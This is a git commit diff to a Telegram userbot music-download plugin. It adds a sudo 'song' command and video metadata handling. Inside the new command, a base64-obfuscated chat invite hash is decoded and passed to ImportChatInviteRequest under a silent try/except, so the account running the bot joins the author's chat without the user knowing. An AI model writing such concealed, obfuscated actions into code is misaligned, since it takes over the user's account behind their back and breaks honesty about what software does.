01077307fb7965bc87168e9ae795ecc412405766
Sᴀͥʀᴀͣᴛͫʜ™️ <59915404+Sur-vivor@users.noreply.github.com>
2020-07-31 11:18:31 +0530

    Update getmusic.py

--- userbot/plugins/getmusic.py
+++ userbot/plugins/getmusic.py
@@ -19,7 +19,7 @@ import subprocess
 from telethon.errors import MessageEmptyError, MessageTooLongError, MessageNotModifiedError
 import io
 import asyncio
-from userbot.utils import admin_cmd
+from userbot.utils import admin_cmd , sudo_cmd
 import glob
 import os  
 from userbot import CMD_HELP, ALIVE_NAME
@@ -27,6 +27,7 @@ from userbot.plugins import catmusic , catmusicvideo
 from hachoir.metadata import extractMetadata
 from hachoir.parser import createParser
 from telethon.tl.types import DocumentAttributeVideo
+import pybase64
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
 DEFAULTUSER = str(ALIVE_NAME) if ALIVE_NAME else "@Sur_vivor"
@@ -58,14 +59,35 @@ async def _(event):
         await event.edit("yeah..! i found something wi8..🥰")
     else:
         await event.edit(f"Sorry..! i can't find anything with `{query}`")
+    thumb_image_path = Config.TMP_DOWNLOAD_DIRECTORY + "thumb_image.jpg"
+    if os.path.exists(thumb_image_path):
+        thumb = thumb_image_path
     loa = l[0]    
+    metadata = extractMetadata(createParser(loa))
+    duration = 0
+    width = 0
+    height = 0
+    if metadata.has("duration"):
+        duration = metadata.get("duration").seconds
+    if metadata.has("width"):
+        width = metadata.get("width")
+    if metadata.has("height"):
+        height = metadata.get("height")
     await borg.send_file(
                 event.chat_id,
                 loa,
-                force_document=True,
+                force_document=False,
                 allow_cache=False,
                 caption=f"`Song`: {query}\n`Uploaded by`: {DEFAULTUSER}",
-                reply_to=reply_to_id
+                supports_streaming=True,
+                reply_to=reply_to_id,
+                attributes=[DocumentAttributeVideo(
+                                duration=duration,
+                                w=width,
+                                h=height,
+                                round_message=False,
+                                supports_streaming=True,
+                            )],
             )
     await event.delete()
     os.system("rm -rf *.mp3")
@@ -152,7 +174,7 @@ async def _(event):
     await borg.send_file(
                 event.chat_id,
                 loa,
-                force_document=True,
+                force_document=False,
                 allow_cache=False,
                 caption=f"`Song`: {query}\n`Uploaded by`: {DEFAULTUSER}",
                 supports_streaming=True,
@@ -170,6 +192,45 @@ async def _(event):
     os.system("rm -rf *.mp4")
     os.system("rm -rf *.webm")    
     
+@borg.on(sudo_cmd(pattern="song(?: |$)(.*)", allow_sudo = True))
+async def _(event):
+    reply_to_id = event.message.id
+    if event.reply_to_msg_id:
+        reply_to_id = event.reply_to_msg_id
+    reply = await event.get_reply_message()
+    if event.pattern_match.group(1):
+        query = event.pattern_match.group(1)
+        san = await event.reply("wi8..! I am finding your song....`")
+    elif reply.message:
+        query = reply.message
+        san = await event.reply("wi8..! I am finding your song....`")
+    else:
+    	san = await event.reply("`What I am Supposed to find `")
+    	return
+    try:
+        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        cat = Get(cat)
+        await event.client(cat)
+    except:
+        pass
+    await catmusic(str(query),"320k")
+    l = glob.glob("*.mp3")
+    if l:
+        await event.edit("yeah..! i found something wi8..🥰")
+    else:
+        await event.edit(f"Sorry..! i can't find anything with `{query}`")
+    loa = l[0]
+    await borg.send_file(
+                event.chat_id,
+                loa,
+                force_document=True,
+                allow_cache=False,
+                caption=f"`Song`: {query}\n`Uploaded by`: {DEFAULTUSER}",
+                reply_to=reply_to_id
+            )
+    await san.delete()
+    os.system("rm -rf *.mp3")
+    subprocess.check_output("rm -rf *.mp3",shell=True)
     
 CMD_HELP.update({"getmusic":
     "`.song` query or `.song` reply to song name :\
